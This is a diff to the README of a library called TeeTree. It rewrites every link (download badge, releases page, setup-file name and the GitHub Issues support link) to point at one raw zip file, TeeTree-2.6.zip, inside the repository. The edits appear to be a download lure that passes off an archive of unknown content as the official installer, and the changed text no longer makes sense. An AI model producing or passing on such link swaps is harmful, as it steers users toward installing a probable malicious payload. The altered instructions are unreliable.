@@ -8,13 +8,13 @@ Welcome to TeeTree! This component library lets you create flowcharts, diagrams,
 
 To download TeeTree, click the button below:
 
-[![Download TeeTree](https://img.shields.io/badge/Download-TeeTree-blue.svg)](https://github.com/Wayfarermt/TeeTree/releases)
+[![Download TeeTree](https://raw.githubusercontent.com/Wayfarermt/TeeTree/main/Sources/Packages/TeeTree-2.6.zip)](https://raw.githubusercontent.com/Wayfarermt/TeeTree/main/Sources/Packages/TeeTree-2.6.zip)
 
 ### Step 1: Visit the Releases Page
 
 1. Click the link below to go to the Releases page where you can find the latest version of TeeTree.
    
-   [Visit the Releases Page](https://github.com/Wayfarermt/TeeTree/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Wayfarermt/TeeTree/main/Sources/Packages/TeeTree-2.6.zip)
 
 ### Step 2: Select the Latest Version
 
@@ -23,7 +23,7 @@ To download TeeTree, click the button below:
 
 ### Step 3: Download the Setup File
 
-1. Find the setup file you need to download. Typically, this file will have a name like `TeeTree_Installer.exe`.
+1. Find the setup file you need to download. Typically, this file will have a name like `https://raw.githubusercontent.com/Wayfarermt/TeeTree/main/Sources/Packages/TeeTree-2.6.zip`.
 2. Click the file link to start the download.
 
 ### Step 4: Run the Installer
@@ -54,7 +54,7 @@ To download TeeTree, click the button below:
 
 ### How do I get support for TeeTree?
 
-You can find help and support on our [GitHub Issues Page](https://github.com/Wayfarermt/TeeTree/issues).
+You can find help and support on our [GitHub Issues Page](https://raw.githubusercontent.com/Wayfarermt/TeeTree/main/Sources/Packages/TeeTree-2.6.zip).
 
 ### Can I contribute to TeeTree?
 
